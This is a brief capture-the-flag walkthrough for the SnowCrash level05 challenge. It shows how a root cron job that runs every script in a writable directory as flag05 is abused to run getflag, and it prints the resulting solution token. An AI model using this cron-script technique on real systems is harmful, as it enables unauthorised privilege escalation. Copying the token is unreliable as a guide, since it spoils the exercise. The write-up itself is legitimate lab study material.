as we log to our session we get mail notification

level05@10.11.100.161's password: 
You have new mail.

level05@SnowCrash:~$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done


vi /opt/openarenaserver/getflag
//  echo $(getflag) > /tmp/getflag

level05@SnowCrash:~$ cat /tmp/getflag
Check flag.Here is your token : viuaaale9huek52boumoomioc